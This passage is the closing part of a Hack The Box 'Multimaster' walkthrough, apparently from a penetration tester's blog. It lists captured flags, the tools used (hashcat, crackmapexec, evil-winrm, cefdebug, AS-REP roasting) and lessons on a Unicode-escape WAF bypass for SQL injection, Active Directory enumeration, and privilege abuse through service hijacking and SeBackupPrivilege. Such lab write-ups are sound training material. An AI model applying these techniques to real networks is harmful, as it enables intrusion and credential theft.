+<p><strong>Why this works:</strong> Server Operators can modify service configurations and start/stop services. When the service starts, it executes the hijacked binary as <strong>SYSTEM</strong>.</p>
+<hr />
+<h2 id="flags">Flags</h2>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Location</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>user.txt</strong></td>
+<td><code>C:\Users\alcibiades\Desktop\user.txt</code></td>
+<td><code>f2f7bb81[redacted]f697903</code></td>
+</tr>
+<tr>
+<td><strong>root.txt</strong></td>
+<td><code>C:\Users\Administrator\Desktop\root.txt</code></td>
+<td><code>6fe41f[redacted]0413d08e</code></td>
+</tr>
+</tbody></table>
+<hr />
+<h2 id="key-tools-used">Key Tools Used</h2>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>nmap</code></td>
+<td>Port/service enumeration</td>
+</tr>
+<tr>
+<td><code>curl</code> / Python <code>requests</code></td>
+<td>SQL injection exploitation</td>
+</tr>
+<tr>
+<td><code>hashcat -m 17900</code></td>
+<td>Keccak-384 hash cracking</td>
+</tr>
+<tr>
+<td><code>hashcat -m 18200</code></td>
+<td>Kerberos AS-REP hash cracking</td>
+</tr>
+<tr>
+<td><code>crackmapexec</code></td>
+<td>Password spraying (SMB/WinRM)</td>
+</tr>
+<tr>
+<td><code>evil-winrm</code></td>
+<td>WinRM shell access</td>
+</tr>
+<tr>
+<td><code>cefdebug.exe</code></td>
+<td>VS Code CEF debugger exploitation</td>
+</tr>
+<tr>
+<td><code>impacket-GetNPUsers</code></td>
+<td>AS-REP roasting</td>
+</tr>
+<tr>
+<td><code>robocopy /B</code></td>
+<td>Backup-mode file copy (SeBackupPrivilege abuse)</td>
+</tr>
+</tbody></table>
+<hr />
+<h2 id="lessons-learned">Lessons Learned</h2>
+<ol>
+<li><p><strong>Unicode WAF Bypass:</strong> JSON endpoints with <code>charset=utf-8</code> may decode <code>\u00XX</code> escape sequences before passing input to the SQL query, allowing WAF bypass.</p>
+</li>
+<li><p><strong>AD Enumeration via SQLi:</strong> MSSQL's <code>SUSER_SID()</code> and <code>SUSER_SNAME()</code> functions can enumerate Active Directory objects through SQL injection, even without command execution.</p>
+</li>
+<li><p><strong>RID Brute-Forcing:</strong> Domain SIDs are predictable. Brute-forcing RIDs through SQLi can reveal hidden users critical for lateral movement.</p>
+</li>
+<li><p><strong>CEF Debugger Exploitation:</strong> Electron applications (like VS Code) expose powerful debug interfaces. Always check running processes for IDEs and browsers.</p>
+</li>
+<li><p><strong>GenericWrite -&gt; ASREPRoast:</strong> GenericWrite on a user is a direct path to compromise. Enabling <code>doesnotrequirepreauth</code> and AS-REP roasting is faster than targeted Kerberoasting.</p>
+</li>
+<li><p><strong>SeBackupPrivilege:</strong> Don't overlook backup/restore privileges. <code>robocopy /B</code> is a simple, elegant way to read protected files without modifying ACLs or getting a full SYSTEM shell.</p>
+</li>
+</ol>
+a:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$f"}}]
+b:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing archive navigation","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-pivotapi-walkthrough","children":[["$","span",null,{"children":"Newer article"}],["$","strong",null,{"children":"Hack The Box: PivotAPI Walkthrough"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",114," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-apt-walkthrough","children":[["$","span",null,{"children":"Older article"}],["$","strong",null,{"children":"Hack The Box: APT Walkthrough"}]]}]}]]}]
+c:["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Public profiles","children":[["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Hack The Box",{"href":"https://app.hackthebox.com/public/users/349278","target":"_blank","rel":"noreferrer","children":["Hack The Box"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Credential wallet",{"href":"https://www.credential.net/profile/cyberkareem/wallet","target":"_blank","rel":"noreferrer","children":["Credential wallet"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Credly",{"href":"https://www.credly.com/users/cyberkareem/badges","target":"_blank","rel":"noreferrer","children":["Credly"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Evidence-led research · authorized assessment"}],["$","$L2",null,{"href":"/services","children":"Explore security services →"}]]}]]}]
+10:T543,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-multimaster-walkthrough/#article","headline":"Hack The Box: Multimaster Walkthrough","description":"An archived walkthrough of the retired Hack The Box Multimaster machine, preserved from Abdullah Kareem's OSEP Prep preparation notes.","url":"https://cyberkareem.com/writing/hackthebox-multimaster-walkthrough/","datePublished":"2026-06-11T16:00:13.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":2180,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSEP-Prep/blob/dadfa9161d72eacac03df456aa443da8b7b6e2f8/HTB-Multimaster.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-multimaster-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-multimaster-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Multimaster Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-multimaster-walkthrough/"}]}]}d:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$10"}}]
+e:["$","$L11",null,{"children":["$","$12",null,{"name":"Next.MetadataOutlet","children":"$@13"}]}]
+13:null
